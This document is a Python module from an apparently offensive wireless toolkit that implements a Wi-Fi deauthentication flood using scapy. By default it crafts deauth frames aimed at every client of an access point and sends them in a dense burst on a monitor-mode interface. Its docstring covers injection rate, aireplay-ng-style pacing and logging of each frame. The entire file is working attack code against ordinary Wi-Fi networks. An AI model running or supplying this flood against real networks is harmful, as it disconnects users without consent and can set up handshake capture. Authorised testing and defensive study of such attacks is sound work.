"""Deauthentication flood against an AP or a specific client."""

from __future__ import annotations

import time

from scapy.config import conf

from ..frames import BROADCAST, craft_deauth
from ..radio import ensure_channel, get_mode


def deauth(
    iface: str,
    bssid: str,
    client: str = BROADCAST,
    count: int = 64,
    interval: float = 0.0,
    channel: int | None = None,
    low_rate: bool = False,
    progress_fn=None,
) -> int:
    """Send count deauth frames from bssid to client.

    low_rate: force injection at 6 Mbps instead of the adapter's
    auto/unset rate -- see frames.craft_deauth for why. Opt-in since it
    costs airtime; most adapters don't need it.

    Returns the count actually handed to the OS for transmission -- 0 if
    iface isn't in monitor mode (frames can't go out at all), N if the
    socket died partway through (N frames got out before the failure).
    This is NOT proof of over-the-air reception: this hardware's TX
    packet counters (`ip -s link`) aren't instrumented for monitor-mode
    injection at all (confirmed live via a second-radio witness -- see
    STATUS.md), so there's no cheap from-Python way to verify actual RF
    transmission. What this DOES catch is the real, previously-silent
    failure mode of calling deauth() against an interface that isn't
    actually in monitor mode (e.g. a stale lock, a failed monitor-mode
    setup) -- previously sendp() would just silently succeed at the OS
    level while nothing left the radio, indistinguishable from "ran
    fine, target just didn't respond".

    Sends one frame per socket.send() call (not a single batched
    sendp(count=...)) and logs each one -- the user asked repeatedly to
    see every individual deauth frame in the log, not just a "sent N"
    summary after the fact.

    interval defaults to 0.0: aireplay-ng's own -0 <count> fires its burst
    back-to-back with no artificial per-frame delay, relying on the driver
    for pacing. An earlier 0.05s sleep between frames stretched a 64-frame
    burst out to 3.2s -- 64 separately-spaced pings instead of one dense
    burst, which is what -0 64 actually means. Still overridable by callers
    that want throttling.
    """
    log = progress_fn or (lambda msg: None)
    if ensure_channel(iface, channel):
        log(f"channel set to {channel}")

    mode = get_mode(iface)
    if mode != "monitor":
        log(f"WARNING: {iface} is in '{mode}' mode, not monitor -- deauth frames cannot transmit")
        return 0

    pkt = craft_deauth(bssid=bssid, client=client, low_rate=low_rate)
    try:
        sock = conf.L2socket(iface=iface)
    except OSError as exc:
        log(f"deauth socket open failed: {exc}")
        return 0
    sent = 0
    try:
        for i in range(count):
            try:
                sock.send(pkt)
            except OSError as exc:
                log(f"deauth send failed after {sent}/{count} frame(s): {exc}")
                return sent
            sent += 1
            log(f"deauth frame {sent}/{count} sent: {bssid} -> {client}")
            if interval and i < count - 1:
                time.sleep(interval)
    finally:
        sock.close()
    return sent
